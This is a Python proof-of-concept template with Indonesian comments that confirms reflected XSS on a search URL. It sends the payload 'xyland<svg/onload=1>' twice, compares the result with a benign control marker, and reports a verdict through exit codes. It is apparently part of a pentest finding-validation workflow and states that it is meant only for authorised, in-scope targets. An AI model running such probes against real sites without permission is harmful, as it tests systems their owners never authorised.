#!/usr/bin/env python3
"""
PoC — Reflected XSS (CONTOH TEMPLATE, bukan untuk target nyata tanpa izin)
Finding   : <finding-id>
Rule      : VAL-XSS-REFLECTED-001  (docs/10-POC-VALIDATION.md)
Safety    : Level 1 — read-only, payload marker non-destruktif
WAJIB     : Jalankan hanya pada target berizin & in-scope (SR-01).

Kontrak exit code: 0=confirmed TP | 2=false positive | 3=inconclusive | 4=blocked
Logika: TP hanya jika payload HTML terpantul TANPA encoding, 2x berturut-turut.
Pantulan teks biasa saja (benign marker) adalah perilaku normal dan BUKAN bukti.
"""
import sys
import requests

TIMEOUT = 10
PAYLOAD = "xyland<svg/onload=1>"
BENIGN = "xyland-benign-marker"


def fetch(url: str, value: str):
    try:
        r = requests.get(url, params={"q": value}, timeout=TIMEOUT)
    except requests.RequestException:
        return None
    return r.text if r.status_code == 200 else None


def main() -> int:
    if len(sys.argv) != 2:
        print("Usage: python3 poc.py https://target.example/search")
        return 3
    url = sys.argv[1]

    bodies = [fetch(url, PAYLOAD) for _ in range(2)]
    control_body = fetch(url, BENIGN)

    if any(b is None for b in bodies) or control_body is None:
        print("VERDICT: INCONCLUSIVE")
        return 3

    positive = [PAYLOAD in b for b in bodies]  # terpantul persis = tanpa encoding
    print(f"[+] Positive test : {positive} (payload reflected unencoded, 2 runs)")
    print(f"[+] Negative ctrl : benign reflected = {BENIGN in control_body} (normal, bukan bukti)")

    if all(positive):
        print("VERDICT: CONFIRMED_TRUE_POSITIVE")
        return 0
    print("VERDICT: FALSE_POSITIVE")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
